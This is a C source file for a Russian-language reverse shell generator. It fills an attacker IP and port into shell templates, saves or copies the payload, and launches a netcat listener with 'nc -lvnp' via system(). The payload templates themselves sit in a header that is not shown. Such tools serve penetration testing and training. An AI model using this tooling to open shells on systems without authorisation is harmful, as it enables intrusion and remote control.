#include "reverse_shell.h"
#include <stdio.h>

#define BUFFER_SIZE 1024


void show_menu(ShellTemplate *templates, int count) {
    printf("\n=== Reverse Shell Generator ===\n");
    printf("Выберите тип reverse shell:\n\n");
    
    for (int i = 0; i < count; i++) {
        printf("%d. %s - %s\n", i + 1, templates[i].name, templates[i].description);
    }
    printf("\n0. Выход\n");
    printf("\nВаш выбор: ");
}

int get_user_choice(int max_options) {
    int user_choice = 0;
    
    if (scanf("%d", &user_choice) != 1) {
        int c;
        while ((c = getchar()) != '\n' && c != EOF);
        printf("Ошибка: введите число\n");
        return get_user_choice(max_options);
    }
    
    if (user_choice < 0 || user_choice > max_options) {
        printf("Ошибка: выберите вариант от 0 до %d\n", max_options);
        return get_user_choice(max_options);
    }
    
    return user_choice;
}

void generate_shell(ShellTemplate *template, char *ip, int port, char *output) {
    // Используем snprintf для безопасной подстановки
    snprintf(output, BUFFER_SIZE, template->template, ip, port);
}

void get_connection_info(char *ip, int *port) {
    printf("Введите IP адрес: ");
    scanf("%15s", ip);  // IPv4 максимум 15 символов
    
    printf("Введите порт: ");
    scanf("%d", port);
}

void save_to_file(const char *filename, const char *content) {
    FILE *file = fopen(filename, "w");
    if (file == NULL) {
        printf("Ошибка: не удалось создать файл %s\n", filename);
        return;
    }
    
    fprintf(file, "%s\n", content);
    fclose(file);
    
    printf("Payload успешно сохранен в файл: %s\n", filename);
}

void copy_to_clipboard(const char *content) {
    FILE *pipe = popen(CLIPBOARD_CMD, "w");
    if (pipe == NULL) {
        printf("Ошибка: не удалось открыть буфер обмена\n");
        return;
    }
    
    fprintf(pipe, "%s", content);
    pclose(pipe);
    printf("Payload скопирован в буфер обмена\n");
}

void start_listener(int port) {
    printf("Запуск netcat listener'а на порту %d...\n", port);
    
    char command[100];
    snprintf(command, sizeof(command), "nc -lvnp %d", port);
    
    printf("Выполняется команда: %s\n", command);
    printf("Для выхода из listener'а используйте Ctrl+C\n\n");
    
    // Запускаем команду
    int result = system(command);
    
    if (result == -1) {
        printf("Ошибка: не удалось запустить netcat\n");
    } else {
        printf("Netcat listener завершен\n");
    }
}